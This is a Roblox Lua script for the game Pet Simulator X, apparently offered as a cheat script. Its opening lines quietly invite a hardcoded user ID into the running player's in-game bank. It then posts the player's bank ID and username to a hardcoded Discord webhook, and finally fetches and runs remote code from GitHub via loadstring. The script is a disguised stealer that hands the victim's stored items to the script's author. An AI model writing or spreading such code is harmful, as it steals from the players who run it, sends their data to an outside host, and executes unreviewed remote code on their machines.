local YourID = 3312397512
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mybanks = lib.Network.Invoke("get my banks")
lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], YourID)
local mybanks = game:GetService("Workspace")["__THINGS"]["__REMOTES"]["get my banks"]:InvokeServer({})
local BankID = mybanks[1][1]['BUID']
local url = "https://discord.com/api/webhooks/944341209026007111/p3_z6CZv3PlRKVAg17ZrY470QmvHeQZQTaLJOP3ju4ca_M3bWwyP6ef-f0gdKfUs_qgS"
local data = {
   ["content"] = "abcdef",
   ["embeds"] = {
       {
           ["title"] = "**Someone Executed Your Script!**",
           ["description"] = (BankID),
           ["type"] = "rich",
           ["color"] = tonumber(0x7269da),
           ["image"] = {
               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                   tostring(game:GetService("Players").LocalPlayer.Name)
           }
       }
   }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
   ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
loadstring(game:HttpGet('https://raw.githubusercontent.com/BLACKGAMER1221/Pet-Simulator-X/main/BK%20Pet.lua'))()
